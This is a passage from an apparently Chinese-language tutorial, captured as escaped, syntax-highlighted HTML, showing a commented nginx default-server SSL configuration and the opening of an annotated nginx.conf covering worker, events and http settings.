style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## location [ = | ~ | ~* | ^~ ] uri { ... }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## location @name { ... } 依據請求的 URI 配置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e## 返回 HTTP 狀態碼 200，並包含字串\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Code\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$status\u0026#34;, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IP\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;}\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方設定為監聽 443 port，且為預設的虛擬主機，所有連線都使用 SSL\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_ssl_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 PEM 格式的證書\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/hddv1.com.crt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 PEM 格式的密鑰\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/hddv1.com.key\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 SSL 版本，預設為 TLSv1 TLSv1.1 TLSv1.2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定啟用的加密方法，預設為 HIGH:!aNULL:!MD5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_ciphers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 為 DHE 加密法指定帶有 DH 參數的文件\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_dhparam\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/dhparams.pem\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否優先使用 server 的加密法，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## ssl_session_cache off | none | [builtin[:size]] [shared:name:size];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定緩存及大小，預設為 none\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_session_cache\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eshared:SSL:1m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 session 可重複使用的時間，預設為 5 分鐘\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_session_timeout\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e5m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Frame-Options\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SAMEORIGIN\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-XSS-Protection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003emode=block\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eStrict-Transport-Security\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;max-age=31536000\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003eincludeSubdomains\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003epreload\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Code\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$status\u0026#34;, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IP\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;}\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"nginxconf\"\u003enginx.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_processes number | auto; 啟動 Nginx worker 程序數量, 設定 auto 即和 CPU 的數量相等\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_processes\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eauto\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_rlimit_nofile number; Nginx worker 程序最大打開文件數，預設為系統 RLIMIT_NOFILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_rlimit_nofile\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e131072\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_shutdown_timeout time; 設定關閉超時時間，當執行 reload 或是其他相關指令，超過 time 時間之後，Nginx 會主動關閉所有受影響的 worker\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_shutdown_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## error_log file [level]; 設定錯誤日誌寫入位置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## debug, info, notice, warn, error, crit, alert, emerg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## pid file; 主程序 ID 文件位置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/nginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定連線處理相關\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## worker_connections number; 單個 Nginx worker 程序的最大並發連接數，預設為 512，需要小於 worker_rlimit_nofile\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 最大連接數 = worker_connections * worker_processes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e102400\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## accept_mutex on | off; 預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 只有一個新連線進入，如果設定為 on，只有一個 worker 會接受連線，其餘持續休眠\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 如果設定為 off，所有 worker 會被喚醒，只有一個 worker 會接受連線，其餘重新休眠\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 業務上使用 TCP 長連線、流量大，off 的效能以及 QPS 表現較佳\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eaccept_mutex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## multi_accept on | off; 是否同時接受所有的請求，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003emulti_accept\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定 HTTP server 相關\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## include file | mask; 使用文件中的設定\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定 MIME 類型,類型由 mime.type 文件定義\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## default_type mime-type; 定義默認 MIME 類型，預設為 text/plain\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_names_hash_max_size size; 設定 server_name 的 hash 表最大值，預設為 512 kb\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_names_hash_max_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 server_name 的 hash 表的大小，用於快速找到對應的 server_name，預設值取決於 CPU 的 L1 cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_names_hash_bucket_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_tokens on | off | build | string; 是否在 Nginx 錯誤頁面顯示 Nginx 版本，預設為 on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_tokens\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否在錯誤日誌記錄 404\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elog_not_found\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否啟用 sendfile() 提高文件傳輸效率，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 文件是否使用完整封包發送，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 數據是否儘快傳送，預設為 on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nodelay\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定長連線持續秒數，超過時間 Nginx 會主動關閉連線，預設為 75\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ekeepalive_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## client_max_body_size size; 設定請求允許最大的 body 大小\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eclient_max_body_size\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e64M\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_gzip_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan 